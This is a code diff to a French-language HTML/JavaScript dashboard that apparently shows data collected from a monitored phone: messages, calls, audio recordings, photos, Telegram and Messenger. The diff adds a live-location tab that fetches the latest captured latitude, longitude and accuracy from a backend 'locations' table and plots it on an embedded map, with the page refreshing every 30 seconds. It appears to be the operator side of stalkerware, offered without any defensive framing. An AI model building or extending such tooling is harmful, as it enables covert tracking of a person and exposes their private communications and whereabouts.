@@ -74,7 +74,7 @@ audio { width:100%; margin-top:8px; }
     <div class="num" id="cnt-photos">-</div>
     <div class="label">PHOTOS</div>
   </div>
-  <div class="card blue" onclick="showTab('telegram')"><div class="num" id="cnt-tg">-</div><div class="label">TELEGRAM</div></div><div class="card dark" onclick="showTab('messenger')">
+  <div class="card blue" onclick="showTab('telegram')"><div class="num" id="cnt-tg">-</div><div class="label">TELEGRAM</div></div><div class="card" style="background:#27ae60;grid-column:span 2" onclick="showTab('localisation')"><div class="num" id="cnt-loc">📍</div><div class="label">LOCALISATION EN DIRECT</div></div><div class="card dark" onclick="showTab('messenger')">
     <div class="num" id="cnt-msngr">-</div>
     <div class="label">MESSENGER</div>
   </div>
@@ -99,7 +99,7 @@ audio { width:100%; margin-top:8px; }
   <div class="section-title">🎙️ ENREGISTREMENTS</div>
   <div id="list-enregistrements"></div>
 </div>
-<div class="section" id="sec-photos" style="display:none">
+<div class="section" id="sec-localisation" style="display:none"><div class="section-title">📍 LOCALISATION</div><div id="map-container" style="padding:12px"><div id="map-info" style="background:#f8f8f8;padding:12px;border-radius:8px;margin-bottom:12px"></div><iframe id="map-frame" width="100%" height="300" style="border:0;border-radius:8px" allowfullscreen loading="lazy"></iframe></div></div><div class="section" id="sec-photos" style="display:none">
   <div class="section-title">📷 PHOTOS</div>
   <div class="photo-grid" id="list-photos"></div>
 </div>
@@ -158,7 +158,8 @@ async function chargerPhotos() {
 }
 
 function showTab(tab) {
-  ["messages","appels","enregistrements","photos"].forEach(t=>{
+  if(tab==="localisation") chargerLocalisation();
+  ["messages","appels","enregistrements","photos","localisation"].forEach(t=>{
     document.getElementById("sec-"+t).style.display = t===tab?"block":"none";
     const el = document.getElementById("tab-"+t);
     if(el) el.className = "tab"+(t===tab?" active":"");
@@ -167,6 +168,17 @@ function showTab(tab) {
   window.scrollTo(0, document.querySelector(".tabs").offsetTop);
 }
 
+async function chargerLocalisation() {
+  const r = await fetch(URL+"/rest/v1/locations?select=*&order=captured_at.desc&limit=1",{headers:H});
+  const locs = await r.json();
+  if(locs.length>0){
+    const l = locs[0];
+    const date = new Date(l.captured_at).toLocaleString("fr-FR");
+    document.getElementById("map-info").innerHTML = `<b>Dernière position</b><br>Lat: ${l.latitude}<br>Lon: ${l.longitude}<br>Précision: ${l.accuracy}m<br>Date: ${date}`;
+    document.getElementById("map-frame").src = `https://maps.google.com/maps?q=${l.latitude},${l.longitude}&z=15&output=embed`;
+    document.getElementById("cnt-loc").textContent = "📍";
+  }
+}
 charger();
 setInterval(charger, 30000);
 </script>
